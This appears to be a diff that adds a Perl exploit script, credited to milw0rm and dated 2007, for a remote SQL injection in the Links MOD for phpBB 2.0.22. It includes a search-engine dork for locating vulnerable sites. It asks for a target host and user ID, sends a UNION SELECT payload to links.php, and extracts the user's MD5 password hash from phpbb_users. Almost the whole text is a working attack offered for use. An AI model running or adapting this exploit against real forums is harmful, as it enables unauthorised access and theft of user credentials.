@@ -1,0 +1,66 @@
+#!/usr/bin/perl
+
+print q{
+
+phpBB <= 2.0.22 - Links MOD <= v1.2.2 Remote SQL Injection Exploit
+
+Bug discovered by Don
+Dork: allinurl:links.php?t=search
+   or: "Links MOD v1.2.2 by phpBB2.de"
+SQL INJECTION: Exploit: links.php?t=search&search_keywords=asd&start=1,1%20UNION%20SELECT%201,username,user_password,4,5,6,7,8,9,10,11,12%20FROM%20phpbb_users%20WHERE%20user_id=2/*
+
+};
+
+use IO::Socket;
+
+print q{
+=> Insert URL
+=> without ( http )
+=> };
+$server = <STDIN>;
+chop ($server);
+print q{
+=> Insert directory
+=> es: /forum/ - /phpBB2/
+=> };
+$dir = <STDIN>;
+chop ($dir);
+print q{
+=> User ID
+=> Number:
+=> };
+$user = <STDIN>;
+chop ($user);
+if (!$ARGV[2]) {
+}
+$myuser = $ARGV[3];
+$mypass = $ARGV[4];
+$myid = $ARGV[5];
+$server =~ s/(http:\/\/)//eg;
+$path = $dir;
+$path .= "links.php?t=search&search_keywords=asd&start=1,1%20UNION%20SELECT%201,username,user_password,4,5,6,7,8,9,10,11,12%20FROM%20phpbb_users%20WHERE%20user_id=".$user."/*";
+print "
+Exploit in process...\r\n";
+$socket = IO::Socket::INET->new(
+Proto => "tcp",
+PeerAddr => "$server",
+PeerPort => "80") || die "Exploit failed";
+print "Exploit\r\n";
+print "in process...\r\n";
+print $socket "GET $path HTTP/1.1\r\n";
+print $socket "Host: $server\r\n";
+print $socket "Accept: */*\r\n";
+print $socket "Connection: close\r\n\r\n";
+print "Exploit finished!\r\n\r\n";
+while ($answer = <$socket>)
+{
+if ($answer =~/(\w{32})/)
+{
+if ($1 ne 0) {
+print "MD5-Hash is: ".$1."\r\n";
+}
+exit();
+}
+}
+
+# milw0rm.com [2007-08-31]
